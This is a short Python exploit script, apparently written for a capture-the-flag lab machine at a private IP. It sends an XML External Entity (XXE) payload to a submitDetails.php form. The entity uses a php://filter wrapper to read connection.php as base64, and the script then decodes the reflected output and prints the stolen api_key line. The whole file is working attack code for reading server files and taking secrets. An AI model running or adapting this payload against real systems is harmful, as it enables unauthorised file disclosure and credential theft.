import requests
import re
import base64

IP = "10.129.144.35"
url = f"http://{IP}/"

session = requests.Session()

xml = """<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [
		<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
	]>
	<root>
		<name>first</name>
		<tel>345234354</tel>
		<email>&xxe;</email>
		<message>comment</message>
	</root>
"""

r = session.post(url + "submitDetails.php", data=xml)

# print(r.text)
result = re.findall(r'Check your email (.*) for further instructions', r.text)
# print(result[0])
answer = base64.b64decode(result[0].encode()).decode()
# print(answer)
print(re.findall(r'api_key = .*;', answer)[0])